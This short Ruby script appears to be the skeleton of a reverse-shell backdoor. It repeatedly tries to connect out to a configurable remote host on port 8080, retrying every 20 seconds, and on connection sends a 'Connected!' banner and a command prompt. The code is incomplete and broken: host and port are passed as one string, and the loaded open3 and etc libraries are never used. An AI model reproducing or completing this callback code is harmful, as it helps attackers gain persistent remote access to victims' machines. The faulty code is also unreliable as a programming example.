require 'socket'
require 'etc'
require 'open3'

RHOST = ""
PORT = "8080"

def rev()
    begin
        sock = TCPSocket.new "#{RHOST}, #{PORT}"
        sock.puts "[\033[1;92m*\033[1;97m] Connected!"
        sock.print ">> "
    rescue 
        sleep 20
        retry
    end

end

rev()